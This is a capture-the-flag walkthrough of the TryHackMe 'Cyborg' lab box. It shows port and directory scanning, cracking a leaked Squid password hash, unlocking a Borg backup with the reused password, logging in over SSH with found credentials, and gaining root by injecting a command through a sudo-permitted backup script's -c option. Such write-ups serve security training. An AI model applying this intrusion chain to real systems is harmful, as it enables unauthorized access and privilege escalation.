# [Cyborg](https://tryhackme.com/room/cyborgt8)

## A box involving encrypted archives, source code analysis and more.

# Compromise the System

## Compromise the machine and read the user.txt and root.txt

### Scan the machine, how many ports are open?

_Hint: Learn about what tools can scan for ports._

1. Run a full TCP port scan. `-p-` covers all 65535 ports instead of nmap's default top 1000, `-sV` fingerprints service versions, and `-sC` runs the default NSE scripts.

```bash
nmap -sVC -p- TARGET_IP
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only two ports are listed as open, 22 and 80. The OpenSSH 7.2p2 and Apache 2.4.18 banners point to Ubuntu 16.04.

**Answer:** `2`

---

### What service is running on port 22?

1. Port 22 is OpenSSH 7.2p2, so the service is SSH.

**Answer:** `ssh`

---

### What service is running on port 80?

1. Port 80 is Apache httpd 2.4.18 serving the stock Ubuntu default page. A default page usually means the real content is in subdirectories, so directory brute forcing is the next step.

**Answer:** `http`

---

### What is the user.txt flag?

_Hint: Have you thought about where the config might be?_

1. Brute force directories on the web server.

```bash
feroxbuster -u http://TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -C 404
```

```
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       15l       74w     6143c http://TARGET_IP/icons/ubuntu-logo.png
200      GET      375l      968w    11321c http://TARGET_IP/
301      GET        9l       28w      316c http://TARGET_IP/admin => http://TARGET_IP/admin/
301      GET        9l       28w      314c http://TARGET_IP/etc => http://TARGET_IP/etc/
200      GET        1l        1w       52c http://TARGET_IP/etc/squid/passwd
200      GET        6l       27w      258c http://TARGET_IP/etc/squid/squid.conf
```

Two directories matter. `/admin/` is an application page, and `/etc/` is an exposed copy of a Squid proxy configuration directory sitting inside the web root.

2. Read `http://TARGET_IP/etc/squid/squid.conf`.

```
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```

This tells us Squid authenticates users with `basic_ncsa_auth` against the file `/etc/squid/passwd`, and that file is also reachable over HTTP.

3. Read `http://TARGET_IP/etc/squid/passwd`.

```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

The `$apr1$` prefix identifies an Apache-style salted MD5 hash.

4. Crack the hash. Hashcat mode 1600 is Apache `$apr1$` MD5. `--username` tells hashcat the file is in `user:hash` format so it ignores the username part.

```bash
echo 'music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' > hash
hashcat -m 1600 hash /usr/share/wordlists/rockyou.txt --username
```

The recovered password is `squidward`.

5. Open `http://TARGET_IP/admin/index.html`. The page links to `archive.tar`, which is a download. Fetch and extract it.

```bash
tar xf archive.tar
```

The archive unpacks to `home/field/dev/final_archive`. The admin section also has a notes page where the users discuss a backup and the proxy, which is consistent with what we found in `/etc/squid`.

6. Inspect the extracted directory.

```bash
cd home/field/dev/final_archive
cat README
```

```
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```

So `final_archive` is a Borg repository, and the README confirms it. Borg repositories can be passphrase-protected, and the Squid password is the obvious candidate.

7. Install Borg, move up one level so the repository is addressable as `./final_archive`, and list the archives it contains. Enter `squidward` when prompted for the passphrase.

```bash
apt install borgbackup
cd ..
borg list ./final_archive
# passphrase: squidward
```

```
music_archive                        Tue, 2020-12-29 15:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
```

The passphrase works, which confirms the password reuse between the Squid hash and the Borg repo. There is one archive, named `music_archive`

8. Extract the archive into the current directory. Borg recreates the original path structure, so a `home/` directory appears in `dev/`.

```bash
borg extract ./final_archive::music_archive
# passphrase: squidward
```

9. Search the extracted files for credentials.

```bash
grep -ri "pass" home 2>/dev/null
```

```
home/alex/Documents/note.txt:Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!
```

This reveals a home directory for a user called `alex`, with a note file in Documents.

10. Read the note.

```bash
cat home/alex/Documents/note.txt
```

```
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

The note contains plaintext credentials for `alex`.

11. Try them over SSH, since port 22 is the only other open service.

```bash
ssh alex@TARGET_IP
# password: S3cretP@s3
```

12. Read the flag from alex's home directory.

```bash
cat user.txt
```

[SCREEN01]

---

### What is the root.txt flag?

_Hint: There might be an interesting file running as root._

1. Check what `alex` is allowed to run with elevated privileges.

```bash
sudo -l
```

```
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

`alex` can run `/etc/mp3backups/backup.sh` as any user, including root, without a password. That is the "interesting file running as root" from the hint.

2. Read the script.

```bash
cat /etc/mp3backups/backup.sh
```

```sh
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
        case "${flag}" in
                c) command=${OPTARG};;
        esac
done



backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd
```

The vulnerability is in the last two lines. The `getopts c:` loop stores whatever we pass with `-c` into the variable `command`, and the script then runs `$($command)`. That is command substitution on user-controlled input, so the string is executed by bash with the script's privileges, which are root because of sudo. The output is captured into `cmd` and printed by `echo $cmd`. Everything above that point is ordinary backup logic and is not relevant to the exploit.

3. Pass a command through `-c` that reads the flag. Its output is captured by the substitution and echoed at the end of the script's output.

```bash
sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"
```

[SCREEN02]

Because `echo $cmd` is unquoted, newlines in the output are collapsed to spaces. That does not matter for a one-line flag, but it is worth remembering if you read a multi-line file this way.
